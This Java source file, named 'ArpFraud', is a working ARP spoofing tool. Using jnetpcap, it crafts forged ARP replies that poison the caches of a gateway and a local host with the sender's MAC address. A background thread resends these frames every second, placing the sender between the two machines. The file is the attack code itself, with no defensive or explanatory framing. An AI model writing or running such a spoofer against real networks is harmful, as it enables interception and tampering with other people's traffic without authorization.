package com.leyilikeang.common.example.my;

import com.leyilikeang.common.util.ConstantUtils;
import com.leyilikeang.common.util.ConvertUtils;
import com.leyilikeang.common.util.PcapUtils;
import org.jnetpcap.Pcap;
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.packet.JPacket;
import org.jnetpcap.packet.JPacketHandler;
import org.jnetpcap.protocol.JProtocol;
import org.jnetpcap.protocol.lan.Ethernet;

/**
 * Created by Goldmsg on 2018/10/22.
 */
public class ArpFraud {

    public static void main(String[] args) {
        String destinationMac = "c4 36 55 92 c0 05";
        String destinationIp = "c0 a8 00 01";
        String sourceMac = "40 e2 30 df f9 ff";
        String sourceIp = "c0 a8 00 06";

        String responseToGateway = destinationMac + sourceMac
                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
                + ConstantUtils.Arp.MAC_LENGTH.getValue()
                + ConstantUtils.Arp.IP_LENGTH.getValue()
                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                + sourceMac + sourceIp + destinationMac + destinationIp;

        destinationMac = "f4 f5 db 2f 98 7b";
        destinationIp = "c0 a8 00 06";
//        sourceMac = "";
        sourceIp = "c0 a8 00 01";

        String responseToHost = destinationMac + sourceMac
                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
                + ConstantUtils.Arp.MAC_LENGTH.getValue()
                + ConstantUtils.Arp.IP_LENGTH.getValue()
                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                + sourceMac + sourceIp + destinationMac + destinationIp;

        destinationMac = "40 e2 30 df f9 ff";
        destinationIp = "c0 a8 00 07";
        sourceMac = "c4 36 55 92 c0 05";
        sourceIp = "c0 a8 00 01";
        String responseToMe = destinationMac + sourceMac
                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
                + ConstantUtils.Arp.MAC_LENGTH.getValue()
                + ConstantUtils.Arp.IP_LENGTH.getValue()
                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                + sourceMac + sourceIp + destinationMac + destinationIp;

        destinationMac = "40 e2 30 df f9 ff";
        destinationIp = "c0 a8 00 07";
        sourceMac = "f4 f5 db 2f 98 7b";
        sourceIp = "c0 a8 00 06";
        String responseToMe2 = destinationMac + sourceMac
                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
                + ConstantUtils.Arp.MAC_LENGTH.getValue()
                + ConstantUtils.Arp.IP_LENGTH.getValue()
                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                + sourceMac + sourceIp + destinationMac + destinationIp;

        final JPacket toGatewayPacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToGateway);
        final JPacket toHostPacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToHost);
        final JPacket toMePacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToMe);
        final JPacket toMePacket2 = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToMe2);

        System.out.println(toGatewayPacket);
        System.out.println(toHostPacket);
        System.out.println(toMePacket);

        PcapUtils.getAllDevs();
        PcapUtils.index = 5;
        PcapUtils.useDev();

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    if (PcapUtils.pcap.sendPacket(toGatewayPacket) != Pcap.OK) {
                        System.out.println(PcapUtils.pcap.getErr());
                    }
                    if (PcapUtils.pcap.sendPacket(toHostPacket) != Pcap.OK) {
                        System.out.println(PcapUtils.pcap.getErr());
                    }
                    if (PcapUtils.pcap.sendPacket(toMePacket) != Pcap.OK) {
                        System.out.println(PcapUtils.pcap.getErr());
                    }
                    if (PcapUtils.pcap.sendPacket(toMePacket2) != Pcap.OK) {
                        System.out.println(PcapUtils.pcap.getErr());
                    }
                }
            }
        }).start();
    }
}
